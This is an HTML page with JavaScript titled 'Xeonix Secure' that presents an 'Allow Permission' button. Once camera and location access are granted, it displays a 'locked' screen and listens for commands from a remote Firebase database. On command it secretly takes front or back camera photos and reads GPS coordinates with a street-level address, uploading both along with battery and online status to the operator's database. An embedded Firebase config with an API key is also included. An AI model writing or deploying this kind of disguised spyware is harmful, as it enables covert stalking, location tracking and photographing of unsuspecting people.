<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xeonix Secure</title>

<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>

<style>
body{
margin:0;
font-family:Arial, sans-serif;
background:#111;
color:white;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
flex-direction:column;
text-align:center;
}
button{
padding:14px 25px;
border:none;
border-radius:8px;
background:#00c6ff;
color:black;
font-size:16px;
cursor:pointer;
}
#adminIcon{
position:absolute;
top:15px;
right:15px;
font-size:20px;
cursor:pointer;
}
.locked{
background:radial-gradient(circle,#001f3f,#000);
}
</style>
</head>
<body>

<div id="adminIcon" onclick="goAdmin()">⚙️</div>

<div id="content">
<h1>Xeonix Secure</h1>
<button onclick="activateAll()">Allow Permission</button>
</div>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyC71owbERIUTdALLUeTILc9KTWYuZ5TNqQ",
  authDomain: "xeonix-e8b4d.firebaseapp.com",
  databaseURL: "https://xeonix-e8b4d-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "xeonix-e8b4d",
  storageBucket: "xeonix-e8b4d.firebasestorage.app",
  messagingSenderId: "1069914635197",
  appId: "1:1069914635197:web:69cfb35ca50b05ac5670d4"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const deviceId="device1";

function goAdmin(){
window.location.href="admin.html";
}

async function activateAll(){

// 1️⃣ GPS permission
await new Promise((resolve,reject)=>{
navigator.geolocation.getCurrentPosition(resolve,reject);
});

// 2️⃣ Kamera permission
try{
let stream = await navigator.mediaDevices.getUserMedia({video:true});
stream.getTracks().forEach(track=>track.stop());
}catch(e){}

lockScreen();
listenCommands();
sendOnlineStatus(true);
sendBattery();
}

function lockScreen(){
document.body.classList.add("locked");
document.getElementById("adminIcon").style.display="none";
document.getElementById("content").innerHTML="<h1>LOCKED BY XEONIX</h1>";
}

function listenCommands(){
db.ref("devices/"+deviceId+"/command").on("value",async(snap)=>{
let cmd=snap.val();
if(!cmd) return;

if(cmd==="get_location"){
getLocation();
}
if(cmd==="take_photo_front"){
capturePhoto("user");
}
if(cmd==="take_photo_back"){
capturePhoto("environment");
}
});
}

async function getLocation(){
navigator.geolocation.getCurrentPosition(async(pos)=>{
let lat=pos.coords.latitude;
let lon=pos.coords.longitude;

let response=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
let data=await response.json();
let addr=data.address||{};

db.ref("devices/"+deviceId+"/gpsHistory").push({
lat:lat,
lon:lon,
accuracy:pos.coords.accuracy,
desa:addr.village||"",
kecamatan:addr.suburb||"",
kabupaten:addr.county||"",
provinsi:addr.state||"",
time:Date.now()
});
});
}

async function capturePhoto(mode){
let stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:mode}});
let video=document.createElement("video");
video.srcObject=stream;
await video.play();

let canvas=document.createElement("canvas");
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
canvas.getContext("2d").drawImage(video,0,0);

let image=canvas.toDataURL("image/jpeg");

stream.getTracks().forEach(track=>track.stop());

db.ref("devices/"+deviceId+"/photos").push({
image:image,
time:Date.now()
});
}

function sendOnlineStatus(status){
db.ref("devices/"+deviceId+"/online").set(status);
}

window.addEventListener("beforeunload",()=>{
sendOnlineStatus(false);
});

function sendBattery(){
if('getBattery' in navigator){
navigator.getBattery().then(function(battery){

function updateBattery(){
db.ref("devices/"+deviceId+"/battery").set({
level: Math.round(battery.level * 100),
charging: battery.charging
});
}

updateBattery();
battery.addEventListener('levelchange', updateBattery);
battery.addEventListener('chargingchange', updateBattery);

});
}
}
</script>
</body>
</html>